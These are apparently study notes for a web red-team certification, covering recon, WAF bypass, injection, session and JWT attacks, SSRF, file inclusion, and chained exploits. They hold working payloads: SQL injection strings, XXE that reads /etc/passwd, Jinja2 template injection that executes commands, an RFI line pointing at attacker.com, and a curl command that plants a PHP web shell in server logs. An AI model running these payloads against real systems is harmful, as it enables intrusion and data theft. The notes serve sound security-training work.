# Web Red Team Analyst (WEB-RTA) Study Notes

## Module 1: Web Application Fundamentals

### Core Components

|Component|Function|
|---|---|
|Web Server|Accepts requests, directs to destination|
|Application Server|Processing tasks, delivers responses|
|Database|Stores, retrieves, organizes data|

### Architecture Layers

|Layer|Components|
|---|---|
|Presentation|Web Server|
|Business|API Layer, Business Logic, Legacy Systems|
|Data|Database Service, Third Party Services|

### OWASP Resources

|Resource|Description|
|---|---|
|OWASP Top 10|Top exploited vulns (Web, API, LLM, CI/CD): 4 year cycle|
|WSTG|Web Security Testing Guide: methodologies & checklists|

---

## Module 2: Tools

### Burp Suite (PortSwigger)

|Tool|Function|
|---|---|
|Proxy|Intercept & modify HTTP(S) traffic|
|Intruder|Automated requests, SQLi testing, brute-force|
|Repeater|Manual request modification & resend|
|Scanner|Automated vuln scanning (Pro)|
|Collaborator|OOB interaction detection (Pro)|

### Nuclei (ProjectDiscovery)

- YAML-based vulnerability scanner
- Targets: Apps, APIs, Networks, DNS, Cloud
- Community-contributed templates

---

## Module 3-4: OSINT & Reconnaissance

### Techniques & Tools

|Technique|Tool|Purpose|
|---|---|---|
|DNS Recon|DNSDumpster|Map attack surface|
|Subdomain Enum|Crt.sh|Find additional targets via CT logs|
|WHOIS|Whois.com|Ownership & registration data|
|Google Dorking|GHDB|Extract info via search operators|

### Google Dork Examples

```
inurl:/wp-content/uploads/ ext:txt "username" | "user name"
intitle:"Index of" inurl:/backup/ "admin.zip"
```

### FFUF

Fast fuzzing for directories, files, parameters, headers, POST data.

---

## Module 5: WAF Bypass

|Technique|Example|
|---|---|
|URL Encoding|`<script>` → `%3Cscript%3E`|
|Double Encoding|`<` → `%253C`|
|Case Changing|`<ScRiPt>`, `SeLeCt>`, `UniOn`|
|Content-Type Manipulation|Change header, add charsets|

---

## Module 6: Injection Attacks

### SQL Fundamentals

**Clauses:** WHERE, ORDER BY, GROUP BY, HAVING, LIMIT

**Operators:** `=`, `!=`, `<>`, `>`, `<`, `AND`, `OR`, `NOT`, `IN`, `BETWEEN`, `LIKE`, `IS NULL`

### SQL Injection Types

|Type|Description|Payload|
|---|---|---|
|Error-Based|Forces verbose errors|`' OR 1=1--`|
|Union-Based|Extract data via UNION|`' UNION SELECT username,password FROM users--`|
|Boolean Blind|Infer from true/false|`' AND 1=1--` vs `' AND 1=2--`|
|Time-Based Blind|Infer from delays|`' OR IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--`|

### SQLi Payloads

```json
// Auth Bypass
{"username": "admin' --", "password": "anything"}

// Column Enumeration
{"username": "admin' OR 1=1 ORDER BY 100--", "password": "anything"}

// Union - Column Count (increment NULLs)
{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "password": "anything"}

// Time-Based (PostgreSQL)
{"username": "admin' OR 1=1; SELECT pg_sleep(5)--", "password": "anything"}
```

### XXE (XML External Entity)

```xml
<!-- Classic XXE - File Read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>

<!-- Blind XXE (OOB) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://webhook.site/<UUID>">]>
<user><name>&xxe;</name></user>
```

### SSTI (Server-Side Template Injection)

```
// Detection
{{7*7}} → 49

// File Read (Jinja2)
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

// RCE (Jinja2)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### NoSQL Injection

```json
// Boolean-Based
{ "owner": { "$ne": "" } }

// Regex Wildcard
{ "owner": { "$regex": ".*" } }

// OR-Based
{ "$or": [{ "owner": "admin" }, { "owner": { "$ne": "admin" } }] }

// Error-Based
{ "owner": { "$abcd": "123" } }
```

### GraphQL Injection

```json
// Error-Based
{"query":"{ user(username:\"qwe'\") { id username balance } }"}

// Introspection
{"query":"{ __schema { types { name fields { name } } } }"}
```

### Command Injection

Test payloads: `ls`, `id`, `whoami`

---

## Module 7: Authentication & Session

### AuthN vs AuthZ

|Concept|Definition|
|---|---|
|Authentication|Verify user identity|
|Authorization|Verify user privileges|

### Brute Force Types

Simple, Dictionary, Credential Stuffing, Reverse, Hybrid

### Session Attacks

|Attack|Description|
|---|---|
|Session Hijacking|Take over valid session|
|Session Fixation|Set/supply session ID victim authenticates with|
|Cookie Manipulation|Manipulate cookies to impersonate|

### IDOR

|Type|Description|Example|
|---|---|---|
|Horizontal|Access same-level user data|`user_id=1001` → `user_id=1002`|
|Vertical|Cross privilege boundaries|`role=user` → `role=admin`|

### JWT Structure

```
HEADER.PAYLOAD.SIGNATURE

Header: {"alg":"HS256","typ":"JWT"}
Payload: Claims (user data, exp, etc.)
Signature: Verification
```

---

## Module 8: Advanced Attacks

### Insecure Deserialization

**Serialization:** Object → Bytes | **Deserialization:** Bytes → Object

Attack: Inject malicious object that executes during deserialization.

### SSRF Targets

```
http://127.0.0.1/admin
http://localhost/admin
http://169.254.169.254/latest/meta-data/  (AWS)
http://[::1]/admin  (IPv6)
```

### File Inclusion

|Type|Source|Example|
|---|---|---|
|LFI|Local server|`?page=../../../etc/passwd`|
|RFI|External|`?page=http://attacker.com/shell.txt`|

**LFI Payloads:**

```
../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

### Path Traversal Payloads

```
../../../etc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### Prototype Pollution

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

### File Upload Bypass

|Technique|Example|
|---|---|
|Double extension|`shell.php.png`|
|Null byte|`shell.php%00.png`|
|Case manipulation|`shell.PhP`|
|Magic bytes|Add PNG header to PHP|
|Alt extensions|`.php5`, `.phtml`, `.phar`|

---

## Module 9: Chained Attacks

### Chain 1: LFI → Log Poisoning → RCE

1. Confirm LFI: `?page=../../../etc/passwd`
2. Poison logs: `curl -A "<?php system(\$_GET['cmd']); ?>" http://target/`
3. Include log: `?page=../../../var/log/apache2/access.log&cmd=id`

**Common Log Paths:**

```
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
```

### Chain 2: SQLi → XXE → File Read

1. SQLi bypass: `Admin' --`
2. XXE in XML input: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
3. Extract via SQLi: `' UNION SELECT product, name FROM items WHERE id=1 --`

### Chain 3: JWT KID → SSRF

Modify JWT `kid` header to attacker URL:

```json
{"alg": "HS256", "typ": "JWT", "kid": "http://internal-server/admin"}
```

### Chain 4: Broken Session → SSTI → RCE

1. Modify JWT: `"role": "user"` → `"role": "admin"`
2. Access admin panel
3. SSTI: `{{7*7}}` → `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`

### Chain 5: OAuth → XXE → Deserialization → RCE

1. Scope upgrade: `scope=read` → `scope=admin`
2. XXE to read config
3. Extract machine keys
4. Deserialization RCE

### Chain Summary

|Chain|Entry → Pivot → Impact|
|---|---|
|LFI → Log Poison|File Inclusion → Logs → RCE|
|SQLi → XXE|Database → XML Parser → File Read|
|JWT KID → SSRF|Token Header → Key Fetch → Internal Access|
|Session → SSTI|Auth Bypass → Template → RCE|
|OAuth → Deser|Authorization → Config → RCE|

---

## Lab Quick Reference

### Brute Force: PIN Reset

1. Intercept `/reset-password` with Burp
2. Send to Intruder, set PIN as payload position
3. Payload: Numbers (100-999)
4. Identify correct PIN by response length

### BOLA

Replace User B's JWT with User A's token to access User A's resources.

### IDOR Examples

```
GET /transactions/<victim_account>
POST /api/virtual-cards/<victim_card_id>/toggle-freeze
```

### OAuth Attacks

```
# Redirect manipulation
redirect_url=https://evil.com

# Scope upgrade
scope=read → scope=admin
```

### JWT Privilege Escalation

1. Decode at jwt.io
2. Modify: `"is_admin": false` → `"is_admin": true`
3. Replace token (signature validation may be skipped)

### LFI → RCE Lab

```bash
# 1. Confirm LFI
http://target/index.php?search=..%2F..%2F..%2Fetc%2Fpasswd

# 2. Poison logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# 3. Trigger RCE
http://target/index.php?search=logs%2Faccess.log&cmd=id
```